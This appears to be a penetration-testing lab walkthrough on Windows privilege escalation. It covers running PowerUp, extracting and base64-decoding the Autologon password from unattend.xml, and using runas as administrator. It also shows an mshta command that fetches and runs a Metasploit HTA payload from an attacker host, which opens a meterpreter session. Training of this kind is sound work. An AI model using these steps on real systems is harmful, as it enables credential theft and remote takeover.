# LAB: Unattended Installation

{% embed url="https://github.com/PowerShellMafia/PowerSploit" %}

## On the Windows target machine

#### Run PowerUp in the target machine to detect privesc vulns:

```
powershell -ep bypass
. .\PowerUp.ps1
Invoke-PrivescAudit
```

<mark style="color:purple;">NOTE:</mark> This has to be run in the "<mark style="color:red;">Privesc</mark>" directory inside "<mark style="color:red;">PowerSploit</mark>"

Cat the "unattend.xml" file and search for the password value in "<mark style="color:red;">Autologon</mark>"

Decode the password and login using:

You can decode the value in powershell using:

* <mark style="color:yellow;">"$password='VALUE'"</mark>
* <mark style="color:yellow;">"$password =\[System.Text.Encoding]::UTF8.GetString(\[System.Convert]::FromBase64String($password))"</mark>
* <mark style="color:yellow;">"echo $password"</mark>
* "<mark style="color:yellow;">runas.exe /user:administrator cmd</mark>" then enter the password

`runas.exe` is a Windows command-line utility that allows users to run specific programs or commands with different user credentials, typically with elevated privileges or as a different user

## Using Kali Attacker machine & Windows Target

Use msfconsole module "<mark style="color:red;">exploit/windows/misc/hta\_server</mark>"

<mark style="color:blue;">This module will host an HTML application that when opened will run a payload via Powershell.</mark>

<figure><img src="../../.gitbook/assets/image (27).png" alt=""><figcaption></figcaption></figure>

Copy the generated payload and run it on the cmd in Windows target.

* "<mark style="color:yellow;">mshta.exe http://10.10.31.2:8080/Bn75U0NL8ONS.hta</mark>"

`mshta.exe` is a Microsoft utility used to execute **Microsoft HTML Applications (HTA)**. HTA files are HTML-based applications that can run as standalone executables with full access to the system, allowing interaction with Windows scripting technologies like VBScript or JScript.

We will then get a meterpreter session on the kali machine.









